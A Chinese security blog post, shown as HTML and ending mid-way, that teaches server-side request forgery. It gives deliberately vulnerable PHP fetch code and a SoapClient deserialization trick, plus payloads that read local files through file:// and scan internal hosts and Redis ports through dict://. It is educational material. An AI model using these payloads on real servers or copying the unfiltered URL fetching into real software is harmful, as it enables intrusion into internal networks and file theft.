<!DOCTYPE html><html lang="zh-CN/zn" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>SSRF | 秋兮成風</title><meta name="description" content="简介SSRF (Server-Side Request Forgery:服务器端请求伪造) 是一种有攻击者构造形成并有服务短发起恶意请求的一个安全漏洞。正是因为恶意请求有服务端发起，而服务端能够请求到与自身相连而与外网隔绝的内部网络系统，所以一般情况下，SSRF的攻击目标是攻击者无法直接访问的内网系统。 SSRF漏洞的形成大多是由于服务短提供了从其他服务器应用获取数据的功能而没有对目标地址做过滤"><meta name="keywords" content="SSRF"><meta name="author" content="秋兮成風"><meta name="copyright" content="秋兮成風"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/tubiao.png"><link rel="canonical" href="http://yoursite.com/2021/04/18/SSRF/"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta property="og:type" content="article"><meta property="og:title" content="SSRF"><meta property="og:url" content="http://yoursite.com/2021/04/18/SSRF/"><meta property="og:site_name" content="秋兮成風"><meta property="og:description" content="简介SSRF (Server-Side Request Forgery:服务器端请求伪造) 是一种有攻击者构造形成并有服务短发起恶意请求的一个安全漏洞。正是因为恶意请求有服务端发起，而服务端能够请求到与自身相连而与外网隔绝的内部网络系统，所以一般情况下，SSRF的攻击目标是攻击者无法直接访问的内网系统。 SSRF漏洞的形成大多是由于服务短提供了从其他服务器应用获取数据的功能而没有对目标地址做过滤"><meta property="og:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><meta property="article:published_time" content="2021-04-18T07:31:26.000Z"><meta property="article:modified_time" content="2021-04-18T07:44:27.552Z"><meta name="twitter:card" content="summary"><script>var activateDarkMode = function () {
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#000')
  }
}
var activateLightMode = function () {
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#fff')
  }
}

var getCookies = function (name) {
  const value = `; ${document.cookie}`
  const parts = value.split(`; ${name}=`)
  if (parts.length === 2) return parts.pop().split(';').shift()
}

var autoChangeMode = 'false'
var t = getCookies('theme')
if (autoChangeMode === '1') {
  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined) {
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport) {
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour <= 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
    }
    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
      if (Cookies.get('theme') === undefined) {
        e.matches ? activateDarkMode() : activateLightMode()
      }
    })
  } else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else if (autoChangeMode === '2') {
  now = new Date()
  hour = now.getHours()
  isNight = hour <= 6 || hour >= 18
  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else {
  if (t === 'dark') activateDarkMode()
  else if (t === 'light') activateLightMode()
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="next" title="内网信息收集" href="http://yoursite.com/2021/04/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  bookmark: {
    message_prev: 'Press',
    message_next: 'to bookmark this page'
  },
  runtime_unit: 'days',
  runtime: false,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  baiduPush: false,
  highlightCopy: true,
  highlightLang: true,
  isPhotoFigcaption: false,
  islazyload: true,
  isanchor: false    
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: undefined,
  isSidebar: true
  }</script><noscript><style>
#nav {
  opacity: 1
}
.justified-gallery img{
  opacity: 1
}
</style></noscript><meta name="generator" content="Hexo 4.2.1"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/touxiang.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">11</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">Tags</div><div class="length_num">7</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">Categories</div><div class="length_num">2</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#简介"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF漏洞相关函数和类"><span class="toc-number">2.</span> <span class="toc-text">SSRF漏洞相关函数和类</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#file-get-contents"><span class="toc-number">2.1.</span> <span class="toc-text">file_get_contents()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fsockopen"><span class="toc-number">2.2.</span> <span class="toc-text">fsockopen()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#curl-exec"><span class="toc-number">2.3.</span> <span class="toc-text">curl_exec()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SoapClient"><span class="toc-number">2.4.</span> <span class="toc-text">SoapClient</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF漏洞利用的相关协议"><span class="toc-number">3.</span> <span class="toc-text">SSRF漏洞利用的相关协议</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#常见利用方式（file、http-s和dict协议）"><span class="toc-number">3.1.</span> <span class="toc-text">常见利用方式（file、http&#x2F;s和dict协议）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#读取内网文件（file协议）"><span class="toc-number">3.1.1.</span> <span class="toc-text">读取内网文件（file协议）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#探测内网主机存活（http-s协议）"><span class="toc-number">3.1.2.</span> <span class="toc-text">探测内网主机存活（http&#x2F;s协议）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#扫描内网端口（http-s和dict协议）"><span class="toc-number">3.1.3.</span> <span class="toc-text">扫描内网端口（http&#x2F;s和dict协议）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#相关绕过姿势"><span class="toc-number">3.1.4.</span> <span class="toc-text">相关绕过姿势</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用HTTP基本身份认证的方式绕过"><span class="toc-number">3.1.5.</span> <span class="toc-text">利用HTTP基本身份认证的方式绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用302跳转绕过内网IP"><span class="toc-number">3.1.6.</span> <span class="toc-text">利用302跳转绕过内网IP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#进制的转换绕过内网IP"><span class="toc-number">3.1.7.</span> <span class="toc-text">进制的转换绕过内网IP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其他各种指向127-0-0-1的地址"><span class="toc-number">3.1.8.</span> <span class="toc-text">其他各种指向127.0.0.1的地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用不存在的协议头绕过指定的协议头"><span class="toc-number">3.1.9.</span> <span class="toc-text">利用不存在的协议头绕过指定的协议头</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用URL的解析问题"><span class="toc-number">3.1.10.</span> <span class="toc-text">利用URL的解析问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常见攻击方式"><span class="toc-number">3.2.</span> <span class="toc-text">常见攻击方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gopher协议再ssrf中的利用"><span class="toc-number">3.2.1.</span> <span class="toc-text">Gopher协议再ssrf中的利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击内网Redis"><span class="toc-number">3.2.2.</span> <span class="toc-text">攻击内网Redis</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#绝对路径写shell"><span class="toc-number">3.2.2.1.</span> <span class="toc-text">绝对路径写shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#写入SSH公钥"><span class="toc-number">3.2.2.2.</span> <span class="toc-text">写入SSH公钥</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#创建计划任务反弹shell"><span class="toc-number">3.2.2.3.</span> <span class="toc-text">创建计划任务反弹shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击内网FastCGI"><span class="toc-number">3.2.3.</span> <span class="toc-text">攻击内网FastCGI</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#使用fcgi-exp工具攻击"><span class="toc-number">3.2.3.1.</span> <span class="toc-text">使用fcgi_exp工具攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用Gopherus工具攻击"><span class="toc-number">3.2.3.2.</span> <span class="toc-text">使用Gopherus工具攻击</span></a></li></ol></li></ol></li></ol></li></ol></div></div></div><div id="body-wrap"><div id="web_bg" data-type="photo"></div><header class="post-bg" id="page-header" style="background-image: url(https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg)"><nav id="nav"><span class="pull-left" id="blog_name"><a class="blog_title" id="site-name" href="/">秋兮成風</a></span><span class="pull-right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">SSRF</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="Created 2021-04-18 15:31:26"><i class="far fa-calendar-alt fa-fw"></i> Created 2021-04-18</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="Updated 2021-04-18 15:44:27"><i class="fas fa-history fa-fw"></i> Updated 2021-04-18</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fas fa-inbox fa-fw post-meta__icon"></i><a class="post-meta__categories" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta__icon"></i><span>Post View:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-commentcount"></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><p><img src= "/img/loading.gif" data-src="/img/SSrf/1.png" alt=""></p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>SSRF (Server-Side Request Forgery:服务器端请求伪造) 是一种有攻击者构造形成并有服务短发起恶意请求的一个安全漏洞。正是因为恶意请求有服务端发起，而服务端能够请求到与自身相连而与外网隔绝的内部网络系统，所以一般情况下，SSRF的攻击目标是攻击者无法直接访问的内网系统。</p>
<p>SSRF漏洞的形成大多是由于服务短提供了从其他服务器应用获取数据的功能而没有对目标地址做过滤和限制。例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等。利用的就是服务端请求伪造，SSRF漏洞可以利用存在缺陷的WEB应用作为代理攻击远程和本地的服务器。</p>
<p><strong>容易出现SSRF的地方有</strong></p>
<blockquote>
<p>1、社交分享功能：获取超链接的标题等内容进行显示<br>2、转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览<br>3、在线翻译：给网址翻译对应网页的内容<br>4、图片加载/下载：例如富文本编辑器中的点击下载图片到本地、通过URL地址加载或下载图片<br>5、图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验<br>6、云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试<br>7、网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作<br>8、数据库内置功能：数据库的比如mongodb的copyDatabase函数<br>9、邮件系统：比如接收邮件服务器地址<br>10、编码处理、属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等<br>11、未公开的api实现以及其他扩展调用URL的功能：可以利用google语法加上这些关键字去寻找SSRF漏洞。一些的url中的关键字有：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……<br>12、从远程服务器请求资源</p>
</blockquote>
<p><strong>SSRF漏洞的危害</strong></p>
<blockquote>
<p>1、对外网、服务器所在内网、服务器本地进行端口扫描，获取一些服务的banner信息等。<br>2、攻击运行在内网或服务器本地的其他应用程序，如redis、mysql等。<br>3、对内网Web应用进行指纹识别，识别企业内部的资产信息。<br>4、攻击内外网的Web应用，主要是使用HTTP GET/POST请求就可以实现的攻击，如sql注入、文件上传等。<br>5、利用file协议读取服务器本地文件等。<br>6、进行跳板攻击等</p>
</blockquote>
<h1 id="SSRF漏洞相关函数和类"><a href="#SSRF漏洞相关函数和类" class="headerlink" title="SSRF漏洞相关函数和类"></a>SSRF漏洞相关函数和类</h1><ul>
<li><code>file_get_contents()：</code>将整个文件或一个url所指向的文件读入一个字符串中</li>
<li><code>readfile()：</code>输出一个文件的内容</li>
<li><code>fsockopen()：</code>打开一个网络连接或者一个Unix 套接字连接</li>
<li><code>curl_exec()：</code>初始化一个新的会话，返回一个cURL句柄，供curlsetopt()，curlexec()和curlclose() 函数使用</li>
<li><code>fopen():</code>打开一个文件文件或者 URL。</li>
<li>……….<br>出上述函数外，PHP原生类SoapClient在触发反序列化时可导致SSRF。<h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h2>测试代码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">echo</span> file_get_contents($url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上述测试代码中，filegetcontents() 函数将整个文件或一个url所指向的文件读入一个字符串中，并展示给用户，我们构造类似 <code>ssrf.php?url=php.ini</code> 的paylaod即可读取服务器本地的任意文件<br><img src= "/img/loading.gif" data-src="/img/SSrf/2.png" alt=""><br>也可以远程访问<br><img src= "/img/loading.gif" data-src="/img/SSrf/3.png" alt=""><br>readfile()函数与file_get_contents()函数相似</p>
<h2 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h2><p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code>用于打开一个网络连接或者一个Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false。</p>
<p>测试代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$host=$_GET[<span class="string">'url'</span>];</span><br><span class="line">$fp = fsockopen($host, <span class="number">80</span>, $errno, $errstr, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!$fp) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$errstr ($errno)&lt;br /&gt;\n"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $out = <span class="string">"GET / HTTP/1.1\r\n"</span>;</span><br><span class="line">    $out .= <span class="string">"Host: $host\r\n"</span>;</span><br><span class="line">    $out .= <span class="string">"Connection: Close\r\n\r\n"</span>;</span><br><span class="line">    fwrite($fp, $out);</span><br><span class="line">    <span class="keyword">while</span> (!feof($fp)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> fgets($fp, <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>构造<code>ssrf.php?url=www.baidu.com</code> 即可成功出发ssrf并返回百度主页：<br><img src= "/img/loading.gif" data-src="/img/SSrf/4.png" alt=""><br>但是该函数的SSRF无法读取本地文件</p>
<h2 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h2><p>curlinit(url)函数初始化一个新的会话，返回一个cURL句柄，供curlsetopt()，curlexec()和curlclose() 函数使用</p>
<p>测试代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">  $link = $_GET[<span class="string">'url'</span>];</span><br><span class="line">  $curlobj = curl_init(); <span class="comment">// 创建新的 cURL 资源</span></span><br><span class="line">  curl_setopt($curlobj, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">  curl_setopt($curlobj,CURLOPT_URL,$link);</span><br><span class="line">  curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); <span class="comment">// 设置 URL 和相应的选项</span></span><br><span class="line">  $result=curl_exec($curlobj); <span class="comment">// 抓取 URL 并把它传递给浏览器</span></span><br><span class="line">  curl_close($curlobj); <span class="comment">// 关闭 cURL 资源，并且释放系统资源</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// $filename = './curled/'.rand().'.txt';</span></span><br><span class="line">  <span class="comment">// file_put_contents($filename, $result); </span></span><br><span class="line">  <span class="keyword">echo</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>构造<code>ssrf.php?url=www.baidu.com</code>即可触发SSRF<br><img src= "/img/loading.gif" data-src="/img/SSrf/5.png" alt=""><br>也可以使用file协议读取文件<br><img src= "/img/loading.gif" data-src="/img/SSrf/6.png" alt=""></p>
<h2 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h2><p>SOAP是简单对象访问协议，简单对象访问协议（SOAP）是一种轻量的、简单的、基于 XML 的协议，它被设计成在 WEB 上交换结构化的和固化的信息。PHP 的 SoapClient 就是可以基于SOAP协议可专门用来访问 WEB 服务的 PHP 客户端。</p>
<p>SoapClient是一个php的内置类，当其进行反序列化时，如果触发了该类中的 __call 方法，那么 __call 便方法可以发送HTTP和HTTPS请求。该类的构造函数如下：<br><code>public SoapClient :: SoapClient(mixed $wsdl [，array $options ]</code></p>
<ul>
<li>第一个参数是用来指明是否是wsdl模式</li>
<li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而 uri 是SOAP服务的目标命名空间</li>
</ul>
<p>知道上述两个参数的含义后，就很容易构造出SSRF的利用Payload了。我们可以设置第一个参数为null，然后第二个参数为一个包含location和uri的数组，location选项的值设置为target_url</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'uri'</span>=&gt;<span class="string">'aaa'</span>, <span class="string">'location'</span>=&gt;<span class="string">'http://192.168.0.112:2333'</span>));</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">$c = unserialize($b);</span><br><span class="line">$c-&gt;a();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-src="/img/SSrf/7.png" alt=""><br>如上图所示, 成功触发<br>由于它仅限于http/https协议，所以用处不是很大。但是如果这里的http头部还存在crlf漏洞，那么我们就可以进行ssrf+crlf，注入或修改一些http请求头，详情请看：<a href="https://www.anquanke.com/post/id/202025" target="_blank" rel="noopener">Session反序列化利用和SoapClient+crlf组合拳进行SSRF</a></p>
<h1 id="SSRF漏洞利用的相关协议"><a href="#SSRF漏洞利用的相关协议" class="headerlink" title="SSRF漏洞利用的相关协议"></a>SSRF漏洞利用的相关协议</h1><p>SSRF漏洞的利用所涉及的协议有：<br><code>file协议：</code> 在有回显的情况下，利用 file 协议可以读取任意文件的内容<br><code>dict协议：</code> 泄露安装软件版本信息，查看端口，操作内网redis服务等<br><code>gopher协议：</code>gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell<br><code>http/s协议：</code>探测内网主机存活</p>
<h2 id="常见利用方式（file、http-s和dict协议）"><a href="#常见利用方式（file、http-s和dict协议）" class="headerlink" title="常见利用方式（file、http/s和dict协议）"></a>常见利用方式（file、http/s和dict协议）</h2><p>SSRF的利用主要就是读取内网文件、探测内网主机存活、扫描内网端口、攻击内网其他应用等，而这些利用的手法无一不与这些协议息息相关。</p>
<p>测试代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">  $link = $_GET[<span class="string">'url'</span>];</span><br><span class="line">  $curlobj = curl_init(); <span class="comment">// 创建新的 cURL 资源</span></span><br><span class="line">  curl_setopt($curlobj, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">  curl_setopt($curlobj,CURLOPT_URL,$link);</span><br><span class="line">  curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); <span class="comment">// 设置 URL 和相应的选项</span></span><br><span class="line">  $result=curl_exec($curlobj); <span class="comment">// 抓取 URL 并把它传递给浏览器</span></span><br><span class="line">  curl_close($curlobj); <span class="comment">// 关闭 cURL 资源，并且释放系统资源</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// $filename = './curled/'.rand().'.txt';</span></span><br><span class="line">  <span class="comment">// file_put_contents($filename, $result); </span></span><br><span class="line">  <span class="keyword">echo</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="读取内网文件（file协议）"><a href="#读取内网文件（file协议）" class="headerlink" title="读取内网文件（file协议）"></a>读取内网文件（file协议）</h3><p>构造一下payload，即可将服务器上的本地文件及网站源码读取出来：<br><code>ssrf.php?url=file://D:/1.txt</code><br><img src= "/img/loading.gif" data-src="/img/SSrf/8.png" alt=""></p>
<h3 id="探测内网主机存活（http-s协议）"><a href="#探测内网主机存活（http-s协议）" class="headerlink" title="探测内网主机存活（http/s协议）"></a>探测内网主机存活（http/s协议）</h3><p>一般是先想办法得到目标主机的网络配置信息，如读取/etc/hosts、/proc/net/arp、/proc/net/fib_trie等文件，从而获得目标主机的内网网段并进行爆破。 </p>
<blockquote>
<p>域网IP地址范围分三类，以下IP段为内网IP段：<br><code>C类：192.168.0.0 - 192.168.255.255</code><br><code>B类：172.16.0.0 - 172.31.255.255</code><br><code>C类：10.0.0.0 - 10.255.255.255</code></p>
</blockquote>
<p>对本地进行测试</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ssrf.php?url=http:<span class="comment">//192.168.0.109</span></span><br><span class="line">ssrf.php?url=http:<span class="comment">//192.168.0.112</span></span><br><span class="line">ssrf.php?url=http:<span class="comment">//192.168.0.133</span></span><br><span class="line">.......</span><br></pre></td></tr></table></figure>
<p>如果存在web服务则正常返回，反之空白<br><img src= "/img/loading.gif" data-src="/img/SSrf/9.png" alt=""><br><img src= "/img/loading.gif" data-src="/img/SSrf/10.png" alt=""></p>
<h3 id="扫描内网端口（http-s和dict协议）"><a href="#扫描内网端口（http-s和dict协议）" class="headerlink" title="扫描内网端口（http/s和dict协议）"></a>扫描内网端口（http/s和dict协议）</h3><p>利用dict协议构造如下payload即可查看内网主机上开放的端口及端口上运行服务的版本信息等：</p>
<p><code>ssrf.php?url=dict://127.0.0.1:80     //http</code><br><code>ssrf.php?url=dict://127.0.0.1:6379   //redis</code></p>
<p><img src= "/img/loading.gif" data-src="/img/SSrf/11.png" alt=""><br><img src= "/img/loading.gif" data-src="/img/SSrf/12.png" alt=""><br>可以借助burp来爆破内网主机上的服务</p>
<h3 id="相关绕过姿势"><a href="#相关绕过姿势" class="headerlink" title="相关绕过姿势"></a>相关绕过姿势</h3><p>对于SSRF的限制大致有以下几种：</p>
<ul>
<li>限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS的请求。</li>
<li>限制域名只能为<a href="http://www.xxx.com" target="_blank" rel="noopener">http://www.xxx.com</a></li>
<li>限制不能访问内网的IP，以防止对内网进行攻击。</li>
